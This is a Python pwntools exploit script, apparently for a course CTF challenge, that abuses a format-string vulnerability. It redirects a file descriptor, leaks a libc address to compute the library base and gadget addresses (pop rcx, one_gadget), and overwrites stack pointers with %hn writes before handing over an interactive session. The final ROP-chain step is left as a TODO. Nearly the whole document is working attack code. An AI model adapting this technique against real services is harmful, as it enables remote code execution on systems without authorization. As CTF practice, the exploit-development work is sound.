from pwn import *
# from IPython import embed
context.arch = 'amd64'

def send_fmt(p):
	r.sendline(p.ljust(0x20, 'z'))
	sleep(1)

def write_addr(ptr_addr, target_addr):
	for i in range(0, 4):
		write_addr = (target_addr >> (16 * i)) % 65536
		send_fmt('%{}c%7$hn'.format(write_addr))
		print('ptr_addr: ' + hex(ptr_addr))
		print('write_addr: ' + hex(write_addr))
		raw_input("[*] write_addr")
		ptr_addr += 2
		send_fmt('%{}c%5$hhn'.format(ptr_addr))

		send_fmt('_%7$p')
		r.recvuntil('_')
		print('7: ' + str(r.recvuntil('z', True)))
		send_fmt('_%9$p')
		r.recvuntil('_')
		print('9: ' + str(r.recvuntil('z', True)))
		r.recv()


# @ r = remote('csie.ctf.tw', 10132)
r = remote('127.0.0.1', 10132)

# we need to change fd from 2(stderr) to 1(stdout), whose address is 0x601010
# write '601010' to %9, whose address is stored in %7
send_fmt('%6295568c%7$n')
# write '01' (originally '02'), whose address is 0x601010 and stored in %9
send_fmt('a%9$hhn')

libc_start_main_offset = 0x00021ab0
# get the address of libc_start_main
send_fmt('%10$p.')
r.recvuntil('0x')
libc_start_main_addr = int(r.recvuntil('.')[:-1], 16) - 231
# @ print('libc_start_main_addr: ' + hex(libc_start_main_addr))
# calculate libc_base
libc_base = libc_start_main_addr - libc_start_main_offset
# @ print('libc_base:' + hex(libc_base))

# @ pop_rcx = 0x03eb0b
pop_rcx = libc_base + 0x03eb0b
one_gadget = libc_base + 0x4f2c5

# leak the address of %7, which is stored in %5
send_fmt('%5$p.')
r.recvuntil('0x')
leak_addr = int(r.recvuntil('.')[:-1], 16)
# leak_addr = int(r.recvuntil('.')[:-1], 16) - 8
r.recv()
print('leak_addr: ' + hex(leak_addr))


# get the last byte of address of %7
ptr_addr = leak_addr % 256
print('ptr_addr: ' + hex(ptr_addr))
# get the address of %10
target_addr = leak_addr + 24
print('target_addr: ' + hex(target_addr))

# write target_addr into %9
write_addr(ptr_addr, target_addr)

# TODO
# change %10 into pop_rcx
# change %11 into 0
# change %12 into one_gadget

r.interactive()
